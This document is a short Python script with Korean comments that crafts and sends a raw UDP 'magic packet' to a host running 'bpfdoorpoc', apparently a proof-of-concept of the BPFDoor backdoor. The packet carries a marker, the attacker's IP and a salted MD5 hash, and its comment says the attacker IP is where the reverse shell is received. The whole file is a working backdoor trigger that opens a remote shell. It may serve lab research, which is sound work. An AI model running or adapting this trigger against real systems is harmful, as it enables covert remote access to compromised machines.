import socket
import struct
import hashlib

# 구성 정보
attacker_ip = "192.168.227.128"  # reverse shell 받을 IP
target_ip = "192.168.227.129"    # bpfdoorpoc 실행 중인 대상
salt = "I5*AYbs@LdaWbsO"
marker = b"9999"
src_port = 12345
dst_port = 53

# ✅ MD5(salt + IP)
md5_input = salt + attacker_ip
md5_hash = hashlib.md5(md5_input.encode()).hexdigest().encode()

# ✅ Payload = marker + IP + 해시
payload = marker + attacker_ip.encode() + md5_hash

# ✅ IP Header
ip_ihl = 5
ip_ver = 4
ip_tos = 0
ip_tot_len = 20 + 8 + len(payload)
ip_id = 54321
ip_frag_off = 0
ip_ttl = 64
ip_proto = socket.IPPROTO_UDP
ip_check = 0
ip_saddr = socket.inet_aton(attacker_ip)
ip_daddr = socket.inet_aton(target_ip)
ip_ihl_ver = (ip_ver << 4) + ip_ihl

ip_header = struct.pack("!BBHHHBBH4s4s",
                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

# ✅ UDP Header
udp_length = 8 + len(payload)
udp_check = 0
udp_header = struct.pack("!HHHH", src_port, dst_port, udp_length, udp_check)

# ✅ 최종 패킷 조립
packet = ip_header + udp_header + payload

# ✅ Raw Socket 전송
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

s.sendto(packet, (target_ip, 0))

print(f"[+] Magic Packet 전송 완료: {payload.decode(errors='ignore')}")
